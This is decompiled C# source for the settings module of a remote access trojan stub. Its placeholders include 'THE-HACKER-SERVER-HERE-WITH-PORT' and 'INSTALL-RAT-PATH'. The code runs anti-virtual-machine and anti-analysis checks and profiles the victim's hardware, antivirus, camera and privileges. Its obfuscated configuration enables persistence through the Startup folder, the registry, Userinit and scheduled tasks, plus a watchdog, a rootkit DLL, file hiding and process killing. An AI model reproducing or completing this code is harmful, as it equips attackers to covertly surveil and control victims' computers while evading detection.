using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic.Devices;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x02000025 RID: 37
	internal class Settings
	{
		// Token: 0x060000BF RID: 191 RVA: 0x000065B8 File Offset: 0x000047B8
		public static void Init()
		{
			Settings.AntiVirtualMachine = Caesars.Decoding(Settings.AntiVirtualMachine);
			if (Convert.ToBoolean(Settings.AntiVirtualMachine))
			{
				AntiVirtual.RunAntiAnalysis();
			}
			Settings.cpuCounter = new PerformanceCounter();
			Settings.cpuCounter.CategoryName = "Proceessor Information";
			Settings.cpuCounter.CounterName = "% Proceessor Utility";
			Settings.cpuCounter.InstanceName = "_Total";
			Settings.PRINCIP = new WindowsPrincipal(WindowsIdentity.GetCurrent());
			Settings.ProcessPath = Process.GetCurrentProcess().MainModule.FileName;
			Settings.Cpu = string.Join(",", Methods.GetHardwareInfo("Win32_Processor", "Name")).Replace("_M1", "");
			Settings.Gpu = string.Join(",", Methods.GetHardwareInfo("Win32_ViedeoController", "Name")).Replace("_M1", "");
			Settings.Ram = Methods.BytesToString(Convert.ToInt64(new ComputerInfo().TotalPhysicalMemory));
			Settings.GpuRam = string.Join(",", Methods.BytesToString(Methods.GetHardwareInfo("Win32_VideoController", "AdapterRAM"))).Replace("_M1", "");
			Settings.WindowsVersion = Methods.GetWindowsVersion().Replace("<@>", "");
			Settings.AntiVirus = Methods.Antivirus().Replace("<@>", "");
			Settings.Camera = Stub.Helper.Camera.havecamera();
			Settings.DataInstall = File.GetCreationTime(Process.GetCurrentProcess().MainModule.FileName).ToString("dd.MM.yyyy");
			Settings.Computer = Methods.Computer();
			Settings.UserName = Methods.GetUserName();
			Settings.isadmin = Methods.IsAdmin().ToString().ToLower();
			Settings.issystem = Methods.IsSystem().ToString().ToLower();
			Settings.hwid = HwidGen.hwid();
			Settings.IP = Caesars.Decoding(Settings.IP);
			Settings.PASTEBIN = Caesars.Decoding(Settings.PASTEBIN);
			Settings.MTX = Caesars.Decoding(Settings.MTX);
			Settings.Version = Caesars.Decoding(Settings.Version);
			Settings.Group = Caesars.Decoding(Settings.Group).Replace("<@>", "");
			Settings.Install = Caesars.Decoding(Settings.Install);
			Settings.StartAsAdmin = Caesars.Decoding(Settings.StartAsAdmin);
			Settings.TaskForSaveAdmin = Caesars.Decoding(Settings.TaskForSaveAdmin);
			Settings.SaveForadmin = string.Concat(new string[]
			{
				Methods.GetPath("%ApplicationData%"),
				@"\Microsoft\Winedows\",
				@"Start Menu\Programs\Startup\",
				Settings.hwid,
				".exe"
			});
			if (Convert.ToBoolean(Settings.Install))
			{
				Settings.InstallWatchDog = Caesars.Decoding(Settings.InstallWatchDog);
				Settings.PathClient = Methods.GetPath(Caesars.Decoding(Settings.PathClient));
				Settings.PathWatchDog = Methods.GetPath(Caesars.Decoding(Settings.PathWatchDog));
				Settings.ROOTKIT = Caesars.Decoding(Settings.ROOTKIT);
				Settings.ROOTKITNM = Caesars.Decoding(Settings.ROOTKITNM);
				Settings.Pumper = Caesars.Decoding(Settings.Pumper);
				Settings.HideFile = Caesars.Decoding(Settings.HideFile);
				Settings.HideFolder = Caesars.Decoding(Settings.HideFolder);
				Settings.UserInit = Caesars.Decoding(Settings.UserInit);
				Settings.HKCU = Caesars.Decoding(Settings.HKCU);
				Settings.HKCUName = Caesars.Decoding(Settings.HKCUName);
				Settings.AntiProcess = Caesars.Decoding(Settings.AntiProcess);
				Settings.AntiProcessMode = Caesars.Decoding(Settings.AntiProcessMode);
				if (Convert.ToBoolean(Settings.InstallWatchDog))
				{
					Settings.TaskForWatchDog = Caesars.Decoding(Settings.TaskForWatchDog);
					Settings.TaskForWatchDogName = Caesars.Decoding(Settings.TaskForWatchDogName);
				}
				Settings.TaskForClient = Caesars.Decoding(Settings.TaskForClient);
				Settings.TaskForClientName = Caesars.Decoding(Settings.TaskForClientName);
			}
			Thread.Sleep(new Random().Next(12000, 16000));
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x000069E8 File Offset: 0x00004BE8
		public static byte[] Get(string name)
		{
			byte[] result;
			using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
			{
				if (manifestResourceStream != null)
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						manifestResourceStream.CopyTo(memoryStream);
						return memoryStream.ToArray();
					}
				}
				result = null;
			}
			return result;
		}

		// Token: 0x0400002E RID: 46
		public static PerformanceCounter cpuCounter;

		// Token: 0x0400002F RID: 47
		public static string hwid;

		// Token: 0x04000030 RID: 48
		public static string WindowsVersion;

		// Token: 0x04000031 RID: 49
		public static string AntiVirus;

		// Token: 0x04000032 RID: 50
		public static string DataInstall;

		// Token: 0x04000033 RID: 51
		public static string Camera;

		// Token: 0x04000034 RID: 52
		public static string Cpu;

		// Token: 0x04000035 RID: 53
		public static string Gpu;

		// Token: 0x04000036 RID: 54
		public static string GpuRam;

		// Token: 0x04000037 RID: 55
		public static string Ram;

		// Token: 0x04000038 RID: 56
		public static string isadmin;

		// Token: 0x04000039 RID: 57
		public static string issystem;

		// Token: 0x0400003A RID: 58
		public static string ProcessPath;

		// Token: 0x0400003B RID: 59
		public static string UserName;

		// Token: 0x0400003C RID: 60
		public static string Computer;

		// Token: 0x0400003D RID: 61
		public static string SaveForadmin;

		// Token: 0x0400003E RID: 62
		public static WindowsPrincipal PRINCIP;

		// Token: 0x0400003F RID: 63
		public static string AntiVirtualMachine = "false";

		// Token: 0x04000040 RID: 64
		public static string IP = "THE-HACKER-SERVER-HERE-WITH-PORT";

		// Token: 0x04000041 RID: 65
		public static string MTX = "Sheet_vqjiggvvvwpjljmzbeq"; //This is a random mutex

		// Token: 0x04000042 RID: 66
		public static string Version = "THE-VERSION-OF-RAT";

		// Token: 0x04000043 RID: 67
		public static string Group = "Default";

		// Token: 0x04000044 RID: 68
		public static string StartAsAdmin = "true";

		// Token: 0x04000045 RID: 69
		public static string TaskForSaveAdmin = "NAME-FOR-ADMIN-TASK";

		// Token: 0x04000046 RID: 70
		public static string Install = "true";

		// Token: 0x04000047 RID: 71
		public static string InstallWatchDog = "true";

		// Token: 0x04000048 RID: 72
		public static string PathClient = "INSTALL-RAT-PATH";

		// Token: 0x04000049 RID: 73
		public static string PathWatchDog = "PATH-FOR-WATCHDOG-PROCESS";

		// Token: 0x0400004A RID: 74
		public static string Pumper = "true";

		// Token: 0x0400004B RID: 75
		public static string HideFile = "true";

		// Token: 0x0400004C RID: 76
		public static string HideFolder = "true";

		// Token: 0x0400004D RID: 77
		public static string UserInit = "true";

		// Token: 0x0400004E RID: 78
		public static string HKCU = "true";

		// Token: 0x0400004F RID: 79
		public static string HKCUName = "NAME-TO-SAVE-IN-REGEDIT";

		// Token: 0x04000050 RID: 80
		public static string TaskForWatchDog = "true";

		// Token: 0x04000051 RID: 81
		public static string TaskForWatchDogName = "NAME-FOR-PROGRAMED-TASK-WATCHDOG";

		// Token: 0x04000052 RID: 82
		public static string TaskForClient = "true";

		// Token: 0x04000053 RID: 83
		public static string TaskForClientName = "NAME-FOR-PROGRAMED-TASK-CLIENT";

		// Token: 0x04000054 RID: 84
		public static string AntiProcess = "true";

		// Token: 0x04000055 RID: 85
		public static string AntiProcessMode = "true";

		// Token: 0x04000056 RID: 86
		public static string ROOTKIT = "true";

		// Token: 0x04000057 RID: 87
		public static string ROOTKITNM = "NAME-TO-DLL-ROOTKIT";

		// Token: 0x04000058 RID: 88
		public static string PASTEBIN = "IPMODE";
	}
}
